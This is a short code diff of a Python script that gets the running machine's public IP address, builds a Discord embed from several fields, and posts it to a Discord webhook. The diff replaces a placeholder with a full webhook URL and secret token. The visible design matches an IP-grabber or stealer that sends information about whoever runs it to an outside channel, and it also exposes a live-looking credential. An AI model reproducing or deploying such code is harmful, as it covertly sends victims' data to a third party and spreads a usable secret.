@@ -3,7 +3,7 @@ import json
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-hook = Webhook("webhook-url-here")
+hook = Webhook("https://discordapp.com/api/webhooks/1419347090647289978/XWTTRxvgKJ7oiLDFMWUVVkeqUCO1BtCToNVufsmCLc9w2Ng_EHgRFC2JcvgibuCbH1uf")
 
 time = datetime.now().strftime("%H:%M %p")  
 ip = requests.get('https://api.ipify.org/').text
@@ -29,4 +29,5 @@ fields = [
 for field in fields:
     if field['value']:
         embed.add_field(name=field['name'], value=field['value'], inline=True)
+
 hook.send(embed=embed)
